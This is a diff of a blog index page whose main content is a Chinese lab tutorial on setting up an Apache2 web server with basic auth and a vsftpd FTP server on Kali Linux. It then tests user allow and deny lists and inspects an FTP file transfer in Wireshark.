-<p>修改<code>/etc/apache2/sites-available/000-default.conf</code>文件，修改内容如下图所示。</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-4.png" alt="1-4"></p>
-<p>修改完成后再去访问就会看到弹出身份认证框</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-5.png" alt="1-5"></p>
-<h1 id="FTP服务器安装与配置"><a href="#FTP服务器安装与配置" class="headerlink" title="FTP服务器安装与配置"></a>FTP服务器安装与配置</h1><h2 id="vsftpd组件的安装"><a href="#vsftpd组件的安装" class="headerlink" title="vsftpd组件的安装"></a>vsftpd组件的安装</h2><p>使用如下命令来安装Apache2的组件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vsftpd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-1.png" alt="2-1"></p>
-<h2 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看状态：/etc/init.d/vsftpd status</span><br><span class="line">开启：/etc/init.d/vsftpd start</span><br><span class="line">关闭：/etc/init.d/vsftpd stop</span><br><span class="line">重启：/etc/init.d/vsftpd restart</span><br></pre></td></tr></table></figure>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>创建专门用于上传下载的目录（记得设置权限，不然会导致无法创建文件）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-2.png" alt="2-2"></p>
-<p>创建新用户并设置密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-3.png" alt="2-3"></p>
-<p>修改配置文件 <code>etc/vsftp.conf</code> ,在文件头添加如下内容</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-4.png" alt="2-4"></p>
-<p><code>取消</code>掉 <code>write_enable=YES</code> 的注释，使其生效，不然无法写入文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-5.png" alt="2-5"></p>
-<p>新建 <code>/etc/allowed_users</code> 文件，添加允许访问的用户，我们在文件中添加我们刚才创建的用户 <code>uftp</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-6.png" alt="2-6"></p>
-<p>可以查看 <code>/etc/ftpusers</code> 文件，文件中的列表是禁止访问的用户</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-7.png" alt="2-7"></p>
-<p>重启 <code>vsftpd</code> 服务，并查看状态</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-8.png" alt="2-8"></p>
-<h2 id="安装-ftp-命令"><a href="#安装-ftp-命令" class="headerlink" title="安装 ftp 命令"></a>安装 ftp 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ftp</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-01.png" alt="2-01"></p>
-<p>至此，vsftp 服务器就安装完成了，下面简单演示一下如何用命令传输文件</p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>通过 <code>ftp + IP地址</code> 命令访问FTP服务；输入正确的用户名和密码进入服务；通过 <code>put</code> 命令来上传指定的文件。如图所示，本次实验将提前准备好的位于用户根目录下的 <code>FTP_Success.gif</code> 文件上传，<code>（local-file）</code>选项填写我们要上传的文件及其所处位置，<code>（remote-file）</code>选项填写文件上传后的位置</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-9.png" alt="2-9"></p>
-<p>通过 <code>netstat -atunp | grep ftp</code> 命令来查看ftp服务使用的端口号</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-10.png" alt="2-10"></p>
-<p>在我们的客户端（也就是我的Windows 10物理机），利用 <code>LeapFTP</code> 软件来连接服务器（也就是我的Kali Linux虚拟机）提供的FTP服务。在主界面点击左上角的 <code>FTP</code>-&gt;<code>Quick Connect</code> 来建立新连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-11.png" alt="2-11"></p>
-<p>在弹出来的对话框中输入，服务器的IP地址、端口号（默认21）、Username、Password。这里的用户名密码填写我们刚才创建的那个用户（既 <strong>uftp</strong> 这个用户）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-12.png" alt="2-12"></p>
-<p>确定后，等待一段时间，就可以在主界面的右侧看到成功连接，并且文件夹里有我们刚才上传的文件：<strong>FTP_Success.gif。</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-13.png" alt="2-13"></p>
-<p>可以右击我们想要下载的目标文件，点击 <strong>Download</strong> 来下载。下载目录可以在主界面的左侧选择，如下图，我们成功将 <strong>FTP_Success.gif</strong> 文件下载到了我物理机的桌面上。</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-14.png" alt="2-14"></p>
-<p>前面有提到 <strong>/etc/allowed_users</strong> 文件是允许访问FTP服务器的用户列表，而 <strong>/etc/ftpusers</strong> 是禁止访问FTP服务器的用户列表，现在我们看一下两个列表的名单</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-15.png" alt="2-15"></p>
-<p>可以看到现在允许访问的只有 <strong>uftp</strong> 怎么一个用户，而 root 用户是禁止访问的。现在我们在 <strong>LeapFTP</strong> 上，用 <strong>root</strong> 用户登录验证一下。可以看到，是登录失败的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-16.png" alt="2-16"></p>
-<p>现在我们将 root 用户添加到允许访问名单中，然后再登录试一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-17.png" alt="2-17"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-18.png" alt="2-18"></p>
-<p>可以看到在我们将 roor 用户添加到允许访问名单，并将之在禁止访问名单中去除后，就可以访问 FTP 服务器了，所以证明允许访问和禁止访问的名单还是有生效的。现在我们用 <strong>Wireshark</strong> 抓包来看一下 FTP 协议从建立连接到下载文件的完整过程</p>
-<p>如下图可见TCP的三次握手建立的过程。FTP分为利用TCP和UDP两类，可以看出来我们本次实验使用的是可靠地TCP</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-19.png" alt="2-19"></p>
-<p>可以看到从第981个包开始，客户端向FTP服务器发起请求，这就是我后来的<strong>下载</strong>操作</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-20.png" alt="2-20"></p>
-<p>我们可以选中Protocol类型为FTP-DATA的数据包，右击-&gt;追踪流-&gt;TCP流，来查看完整的TCP流数据</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-21.png" alt="2-21"></p>
-<p>从本TCP流中可看出，都是服务器向客户端发送数据，并且传输的内容为一张gif图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-22.png" alt="2-22"></p>
-<p>可以将这个数据流以原始数据的方式保存下来，并命名为 <strong>wireshark.gif</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-23.png" alt="2-23"></p>
-<p>借助工具 <strong>winhex</strong> 将抓取下来的图片的十六进制与我们原本用来测试的 <strong>FTP_Success.gif</strong> 对比一下，不仅可以用gif图片的格式打开查看，而且内容没有半点差异</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-24.png" alt="2-24"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-25.png" alt="2-25"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题（1-10）/">展开全文 >></a>
         </p>
       
 
@@ -1417,6 +1458,148 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Linux系统下搭建Web服务器和FTP服务器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/" class="archive-article-date">
+  	<time datetime="2019-09-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Web服务器安装与配置"><a href="#Web服务器安装与配置" class="headerlink" title="Web服务器安装与配置"></a>Web服务器安装与配置</h1><h2 id="Apache2和php组件的安装"><a href="#Apache2和php组件的安装" class="headerlink" title="Apache2和php组件的安装"></a>Apache2和php组件的安装</h2><p>使用如下命令来安装Apache2和php的组件</p>
+<p>Ps：如果只安装Apache2，将会导致写的php文件无法被解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br><span class="line">apt-get install php</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-1.png" alt="1-1"></p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态：/etc/init.d/apache2 status（service apache2 status）</span><br><span class="line">开启：/etc/init.d/apache2 start（service apache2 start）</span><br><span class="line">关闭：/etc/init.d/apache2 stop（service apache2 stop）</span><br><span class="line">重启：/etc/init.d/apache2 restart（service apache2 restart）</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-2.png" alt="1-2"></p>
+<h2 id="网站根目录"><a href="#网站根目录" class="headerlink" title="网站根目录"></a>网站根目录</h2><p>网站根目录位于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+<p>创建文件时，一些文件记得修改文件对应的权限，才能访问</p>
+<h2 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h2><p>Apache2带有登录验证的功能，（1） 在<code>/etc</code>目录下创建<code>.Webpasswd</code>文件，设置登陆使用的用户名和密码。该文件为验证使用的储存用户名密码的文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-3.png" alt="1-3"></p>
+<p>修改<code>/etc/apache2/sites-available/000-default.conf</code>文件，修改内容如下图所示。</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-4.png" alt="1-4"></p>
+<p>修改完成后再去访问就会看到弹出身份认证框</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-5.png" alt="1-5"></p>
+<h1 id="FTP服务器安装与配置"><a href="#FTP服务器安装与配置" class="headerlink" title="FTP服务器安装与配置"></a>FTP服务器安装与配置</h1><h2 id="vsftpd组件的安装"><a href="#vsftpd组件的安装" class="headerlink" title="vsftpd组件的安装"></a>vsftpd组件的安装</h2><p>使用如下命令来安装Apache2的组件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vsftpd</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-1.png" alt="2-1"></p>
+<h2 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看状态：/etc/init.d/vsftpd status</span><br><span class="line">开启：/etc/init.d/vsftpd start</span><br><span class="line">关闭：/etc/init.d/vsftpd stop</span><br><span class="line">重启：/etc/init.d/vsftpd restart</span><br></pre></td></tr></table></figure>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>创建专门用于上传下载的目录（记得设置权限，不然会导致无法创建文件）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-2.png" alt="2-2"></p>
+<p>创建新用户并设置密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-3.png" alt="2-3"></p>
+<p>修改配置文件 <code>etc/vsftp.conf</code> ,在文件头添加如下内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-4.png" alt="2-4"></p>
+<p><code>取消</code>掉 <code>write_enable=YES</code> 的注释，使其生效，不然无法写入文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-5.png" alt="2-5"></p>
+<p>新建 <code>/etc/allowed_users</code> 文件，添加允许访问的用户，我们在文件中添加我们刚才创建的用户 <code>uftp</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-6.png" alt="2-6"></p>
+<p>可以查看 <code>/etc/ftpusers</code> 文件，文件中的列表是禁止访问的用户</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-7.png" alt="2-7"></p>
+<p>重启 <code>vsftpd</code> 服务，并查看状态</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-8.png" alt="2-8"></p>
+<h2 id="安装-ftp-命令"><a href="#安装-ftp-命令" class="headerlink" title="安装 ftp 命令"></a>安装 ftp 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ftp</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-01.png" alt="2-01"></p>
+<p>至此，vsftp 服务器就安装完成了，下面简单演示一下如何用命令传输文件</p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>通过 <code>ftp + IP地址</code> 命令访问FTP服务；输入正确的用户名和密码进入服务；通过 <code>put</code> 命令来上传指定的文件。如图所示，本次实验将提前准备好的位于用户根目录下的 <code>FTP_Success.gif</code> 文件上传，<code>（local-file）</code>选项填写我们要上传的文件及其所处位置，<code>（remote-file）</code>选项填写文件上传后的位置</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-9.png" alt="2-9"></p>
+<p>通过 <code>netstat -atunp | grep ftp</code> 命令来查看ftp服务使用的端口号</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-10.png" alt="2-10"></p>
+<p>在我们的客户端（也就是我的Windows 10物理机），利用 <code>LeapFTP</code> 软件来连接服务器（也就是我的Kali Linux虚拟机）提供的FTP服务。在主界面点击左上角的 <code>FTP</code>-&gt;<code>Quick Connect</code> 来建立新连接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-11.png" alt="2-11"></p>
+<p>在弹出来的对话框中输入，服务器的IP地址、端口号（默认21）、Username、Password。这里的用户名密码填写我们刚才创建的那个用户（既 <strong>uftp</strong> 这个用户）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-12.png" alt="2-12"></p>
+<p>确定后，等待一段时间，就可以在主界面的右侧看到成功连接，并且文件夹里有我们刚才上传的文件：<strong>FTP_Success.gif。</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-13.png" alt="2-13"></p>
+<p>可以右击我们想要下载的目标文件，点击 <strong>Download</strong> 来下载。下载目录可以在主界面的左侧选择，如下图，我们成功将 <strong>FTP_Success.gif</strong> 文件下载到了我物理机的桌面上。</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-14.png" alt="2-14"></p>
+<p>前面有提到 <strong>/etc/allowed_users</strong> 文件是允许访问FTP服务器的用户列表，而 <strong>/etc/ftpusers</strong> 是禁止访问FTP服务器的用户列表，现在我们看一下两个列表的名单</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-15.png" alt="2-15"></p>
+<p>可以看到现在允许访问的只有 <strong>uftp</strong> 怎么一个用户，而 root 用户是禁止访问的。现在我们在 <strong>LeapFTP</strong> 上，用 <strong>root</strong> 用户登录验证一下。可以看到，是登录失败的</p>
